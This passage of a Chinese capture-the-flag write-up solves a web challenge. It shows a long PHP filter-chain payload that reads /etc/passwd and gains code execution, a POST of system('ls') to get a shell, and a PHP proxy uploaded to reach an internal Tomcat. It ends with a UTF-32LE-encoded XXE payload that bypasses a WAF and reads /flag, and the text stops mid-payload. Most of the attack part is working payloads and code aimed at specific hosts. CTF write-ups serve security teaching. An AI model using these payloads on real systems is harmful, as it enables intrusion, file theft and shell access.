CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500-1983.UCS-2BE%7Cconvert.iconv.MIK.UCS2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode/resource=/etc/passwd">http://47.94.151.201:31863/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd</a></p><p>POST<br>2&#x3D;system(‘ls’);</p>          </div><p>用上面两种方法都能getshell，但是会发现读不了flag，没权限</p><p>用<code>ps -aux</code>命令看下进程，发现root用户开了个<code>tomcat</code>服务</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-4.png"></p><p>curl试一下tomcat的默认8080端口，有内容</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-5.png"></p><p>但是命令行不好做题，就先考虑代理出来</p><p>web根目录下传个<code>proxy.php</code>，注意修改下地址</p><p><a href="https://blog.csdn.net/weixin_44599931/article/details/124981841">项目地址</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment">    PHP接口代理转发：</span><br><span class="hljs-comment">    以Golang接口转发为例；</span><br><span class="hljs-comment">    如有必要，请设置内网IP为白名单；</span><br><span class="hljs-comment">    建议内网接口返回格式：Content-Type: text/html; charset=UTF-8；</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment">    使用示例：</span><br><span class="hljs-comment">    $host = &quot;http://127.0.0.2&quot;; // 外网网址（主网址或有部分路径）</span><br><span class="hljs-comment">    $intranet = &#x27;http://127.0.0.4&#x27;; // 内网网址（主网址或有部分路径）</span><br><span class="hljs-comment">    $php_proxy = new php_proxy();</span><br><span class="hljs-comment">    $back = $php_proxy-&gt;request_intranet($host, $intranet);</span><br><span class="hljs-comment">    echo $back;</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">php_proxy</span></span>&#123;<br> <br>    <span class="hljs-comment">// 发送get、post请求</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">request_option</span>(<span class="hljs-params"><span class="hljs-variable">$request_url</span>=<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$method</span>=<span class="hljs-string">&#x27;post&#x27;</span>, <span class="hljs-variable">$request_data</span>=[], <span class="hljs-variable">$to_json</span>=<span class="hljs-literal">false</span></span>): <span class="hljs-title">string</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$request_url</span>)) &#123;<br>            <span class="hljs-variable">$back</span> = <span class="hljs-string">&#x27;&#123;&quot;state&quot;:0, &quot;msg&quot;:&quot;request_url is null&quot;, &quot;content&quot;:&quot;&quot;&#125;&#x27;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$method</span> == <span class="hljs-string">&#x27;post&#x27;</span> || <span class="hljs-variable">$method</span> == <span class="hljs-string">&#x27;POST&#x27;</span>)&#123;<br>                <span class="hljs-variable">$body</span> = <span class="hljs-title function_ invoke__">http_build_query</span>(<span class="hljs-variable">$request_data</span>);<br>                <span class="hljs-variable">$options</span> = [<br>                    <span class="hljs-string">&#x27;http&#x27;</span> =&gt; [<br>                        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-comment">// 注意要大写</span><br>                        <span class="hljs-string">&#x27;header&#x27;</span> =&gt; <span class="hljs-string">&#x27;Content-type:application/x-www-form-urlencoded&#x27;</span>,<br>                        <span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$body</span>,<br>                        <span class="hljs-string">&#x27;ignore_errors&#x27;</span>=&gt; <span class="hljs-literal">true</span>, <span class="hljs-comment">// 忽略报错，直接返回接口内容</span><br>                    ],<br>                ];<br>                <span class="hljs-variable">$context</span> = <span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$options</span>);<br>                <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$request_url</span>, <span class="hljs-literal">false</span>, <span class="hljs-variable">$context</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$method</span> == <span class="hljs-string">&#x27;get&#x27;</span>|| <span class="hljs-variable">$method</span> == <span class="hljs-string">&#x27;GET&#x27;</span>)&#123;<br>                <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>                <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$request_url</span>);<br>                <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">// 不抓取头部信息。只返回数据</span><br>                <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_TIMEOUT, (<span class="hljs-keyword">int</span>)<span class="hljs-number">60000</span>); <span class="hljs-comment">// 超时设置</span><br>                <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">// 1表示不返回bool值</span><br>                <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>                <span class="hljs-comment">// $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); // 获取接口状态码</span><br>                <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&#123;&quot;state&quot;:0, &quot;msg&quot;:&quot;method error. method is only in [get, post], options etc be not supported.&quot;, &quot;content&quot;:&quot;&quot;&#125;&#x27;</span>;<br>            &#125;<br> <br>            <span class="hljs-variable">$back</span> = <span class="hljs-variable">$data</span>;<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$to_json</span> == <span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$back</span>, <span class="hljs-literal">true</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable">$back</span>;<br>        &#125;<br> <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// 获取完整网址</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_url</span>(<span class="hljs-params"></span>): <span class="hljs-title">string</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTPS&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTPS&#x27;</span>] == <span class="hljs-string">&#x27;on&#x27;</span>) &#123;<br>            <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;https://&#x27;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://&#x27;</span>;<br>        &#125;<br>        <span class="hljs-comment">//这里的逻辑会导致访问内网的URI与内网相同</span><br>        <span class="hljs-comment">//采用PATH_INFO的模式来表示内网需要的URI</span><br>        <span class="hljs-comment">//即 外 http://127.0.0.1/proxy.php/index =&gt; 内 http://127.0.0.1/index</span><br>        <span class="hljs-comment">// return $url.$_SERVER[&#x27;SERVER_NAME&#x27;].&#x27;:&#x27;.$_SERVER[&#x27;SERVER_PORT&#x27;].$_SERVER[&#x27;REQUEST_URI&#x27;];</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$url</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>].<span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>];<br>    &#125;<br> <br>    <span class="hljs-comment">// 是post</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_post</span>(<span class="hljs-params"></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) == <span class="hljs-string">&#x27;POST&#x27;</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// 是get</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_get</span>(<span class="hljs-params"></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) == <span class="hljs-string">&#x27;GET&#x27;</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// 生成内网网址：把外网网址解析到内网网址</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span></span>): <span class="hljs-title">string</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_url</span>()); <span class="hljs-comment">// 实际代理地址（就是替换主网址或路径）</span><br>    &#125;<br> <br>    <span class="hljs-comment">// 转发接口</span><br>    <span class="hljs-comment">// 请从此处调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">request_intranet</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span></span>): <span class="hljs-title">string</span></span>&#123;<br>        <span class="hljs-comment">// 测试的内网请求地址：$request_url = http://127.0.0.l:8000/api.gen1/admin</span><br>        <span class="hljs-variable">$request_url</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">make_request_url</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">is_post</span>())&#123;<br>            <span class="hljs-variable">$request_array</span> = <span class="hljs-variable">$_REQUEST</span>; <span class="hljs-comment">// 请求参数数组</span><br>            <span class="hljs-variable">$back</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">request_option</span>(<span class="hljs-variable">$request_url</span>, <span class="hljs-string">&#x27;post&#x27;</span>, <span class="hljs-variable">$request_array</span>, <span class="hljs-literal">false</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">is_get</span>())&#123;<br>            <span class="hljs-variable">$request_array</span> = [];<br>            <span class="hljs-variable">$back</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">request_option</span>(<span class="hljs-variable">$request_url</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-variable">$request_array</span>, <span class="hljs-literal">false</span>);<br>        &#125; <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$back</span> = <span class="hljs-string">&#x27;&#123;&quot;state&quot;:0, &quot;msg&quot;:&quot;method error. method is only in [get, post], options etc be not supported.&quot;, &quot;content&quot;:&quot;&quot;&#125;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$back</span>;<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-comment">// 返回数据</span><br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;http://82.157.177.192:46728&quot;</span>; <span class="hljs-comment">// 外网网址（主网址或有部分路径）</span><br><span class="hljs-variable">$intranet</span> = <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>; <span class="hljs-comment">// 内网网址（主网址或有部分路径）</span><br><span class="hljs-variable">$php_proxy</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">php_proxy</span>();<br><span class="hljs-variable">$back</span> = <span class="hljs-variable">$php_proxy</span>-&gt;<span class="hljs-title function_ invoke__">request_intranet</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$intranet</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$back</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>之后访问<code>http://IP:PORT/proxy.php/index</code>，就相当于访问<code>http://InnerIP:InnerPORT/index</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-6.png"></p><p>抓包一看，很明显的<code>XXE</code></p><p>fuzz一下，可恶，竟然还有waf</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-7.png"></p><p>可以利用编码转换绕过waf<br><code>iconv -f utf8 -t UTF-32LE  1.xml &gt; 2.xml</code></p><p>这里放一个编码后的payload（本地dtd读文件报错带flag）：<br><code>%3C%00%00%00%3F%00%00%00x%00%00%00m%00%00%00l%00%00%00+%00%00%00v%00%00%00e%00%00%00r%00%00%00s%00%00%00i%00%00%00o%00%00%00n%00%00%00%3D%00%00%00%22%00%00%001%00%00%00.%00%00%000%00%00%00%22%00%00%00+%00%00%00%3F%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%21%00%00%00D%00%00%00O%00%00%00C%00%00%00T%00%00%00Y%00%00%00P%00%00%00E%00%00%00+%00%00%00m%00%00%00e%00%00%00s%00%00%00s%00%00%00a%00%00%00g%00%00%00e%00%00%00+%00%00%00%5B%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%25%00%00%00+%00%00%00l%00%00%00o%00%00%00c%00%00%00a%00%00%00l%00%00%00_%00%00%00d%00%00%00t%00%00%00d%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%22%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00t%00%00%00m%00%00%00p%00%00%00%2F%00%00%001%00%00%00.%00%00%00d%00%00%00t%00%00%00d%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%25%00%00%00+%00%00%00c%00%00%00o%00%00%00n%00%00%00d%00%00%00i%00%00%00t%00%00%00i%00%00%00o%00%00%00n%00%00%00+%00%00%00%27%00%00%00a%00%00%00a%00%00%00a%00%00%00%29%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%22%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00f%00%00%00l%00%00%00a%00%00%00g%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00e%00%00%00v%00%00%00a%00%00%00l%00%00%00+%00%00%00%22%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%006%00%00%00%3B%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00e%00%00%00r%00%00%00r%00%00%00o%00%00%00r%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%007%00%00%00%3B%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00n%00%00%00o%00%00%00n%00%00%00e%00%00%00x%00%00%00i%00%00%00s%00%00%00t%00%00%00e%00%00%00n%00%00%00t%00%00%00%2F%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3B%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%007%00%00%00%3B%00%00%00%3E%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00e%00%00%00v%00%00%00a%00%00%00l%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00e%00%00%00r%00%00%00r%00%00%00o%00%00%00r%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00L%00%00%00E%00%00%00M%00%00%00E%00%00%00N%00%00%00T%00%00%00+%00%00%00a%00%00%00a%00%00%00+%00%00%00%28%00%00%00b%00%00%00b%00%00%00%27%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%25%00%00%00l%00%00%00o%00%00%00c%00%00%00a%00%00%00l%00%00%00_%00%00%00d%00%00%00t%00%00%00d%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00%5D%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00n%00%00%00a%00%00%00m%00%00%00e%00%00%00%3E%00%00%00f%00%00%00l%00%00%00a%00%00%00g%00%00%00%3C%